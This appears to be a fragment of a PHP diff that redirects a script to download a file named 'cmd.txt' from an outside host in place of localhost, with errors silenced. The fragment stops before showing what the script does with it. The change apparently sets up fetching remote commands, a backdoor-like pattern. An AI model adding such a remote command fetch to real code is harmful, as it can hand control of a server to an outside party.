@@ -1,6 +1,6 @@
 <?php
 
-$cont = @file_get_contents("http://localhost/cmd.txt");
+$cont = @file_get_contents("http://arunz.x10.bz/upload/files/cmd.txt");
 
 if($cont) {
 
